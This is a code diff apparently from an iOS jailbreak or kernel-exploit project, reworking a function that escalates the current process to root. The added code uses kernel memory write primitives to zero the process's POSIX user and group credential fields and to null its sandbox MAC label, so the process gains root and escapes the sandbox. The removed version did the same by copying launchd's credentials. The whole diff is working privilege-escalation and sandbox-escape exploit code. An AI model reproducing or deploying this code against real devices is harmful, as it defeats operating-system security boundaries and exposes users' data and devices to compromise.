@@ -246,40 +246,40 @@ static uint64_t sbx_ucredbyproc(uint64_t proc) {
 }
 
 int sandbox_elevate_to_root(uint64_t self_proc) {
-    uint64_t launchd = proc_find_by_name("launchd");
-    if (!launchd || launchd == (uint64_t)-1) {
-        NSLog(@"[SBX] elevate: procbyname(\"launchd\") failed; trying pid 1 fallback");
-        launchd = proc_find(1);
-        if (launchd && launchd != (uint64_t)-1) {
-            NSLog(@"[SBX] elevate: resolved launchd via pid 1 fallback: 0x%llx", launchd);
-        }
-    }
-    if (!launchd || launchd == (uint64_t)-1) {
-        NSLog(@"[SBX] elevate: could not find launchd");
-        return -1;
-    }
-
-    uint64_t launchducred = sbx_ucredbyproc(launchd);
-    if (!launchducred) {
-        NSLog(@"[SBX] elevate: failed to get valid ucred from launchd");
-        return -1;
-    }
-    NSLog(@"[SBX] elevate: launchd ucred: 0x%llx", launchducred);
-
     if (!self_proc) {
         NSLog(@"[SBX] elevate: failed to get our proc");
         return -1;
     }
     NSLog(@"[SBX] elevate: ourproc: 0x%llx", self_proc);
 
-    uint64_t ourucredraw = early_kread64(self_proc + 0x10);
-    uint64_t ourucred = S(ourucredraw);
+    uint64_t ourucred = sbx_ucredbyproc(self_proc);
+    if (!ourucred) {
+        NSLog(@"[SBX] elevate: failed to get our ucred via sbx_ucredbyproc");
+        return -1;
+    }
     NSLog(@"[SBX] elevate: ourucred: 0x%llx", ourucred);
 
-    early_kwrite64(self_proc + 0x10, launchducred);
+    // 1. Elevate POSIX credentials to root
+    uint64_t posix_cred = ourucred + OFF_UCRED_CR_POSIX;
+    kwrite32(posix_cred + OFF_POSIX_CR_UID, 0);
+    kwrite32(posix_cred + OFF_POSIX_CR_RUID, 0);
+    kwrite32(posix_cred + OFF_POSIX_CR_SVUID, 0);
+    kwrite32(posix_cred + OFF_POSIX_CR_RGID, 0);
+    kwrite32(posix_cred + OFF_POSIX_CR_SVGID, 0);
+    kwrite32(posix_cred + OFF_POSIX_CR_GMUID, 0);
+
+    // 2. Unsandbox by nullifying cr_label->sandbox completely
+    // This bypasses specific MAC deny rules for /var/mobile/Library/
+    uint64_t label = S(early_kread64(ourucred + OFF_UCRED_CR_LABEL));
+    if (label && K(label)) {
+        kwrite64(label + OFF_LABEL_SANDBOX, 0);
+        NSLog(@"[SBX] elevate: offset OFF_LABEL_SANDBOX cleared to 0");
+    } else {
+        NSLog(@"[SBX] elevate: failed to find cr_label to unsandbox");
+    }
 
     if (getuid() == 0) {
-        NSLog(@"[SBX] elevate success!");
+        NSLog(@"[SBX] elevate success! uid: %d", getuid());
         return 0;
     }
 
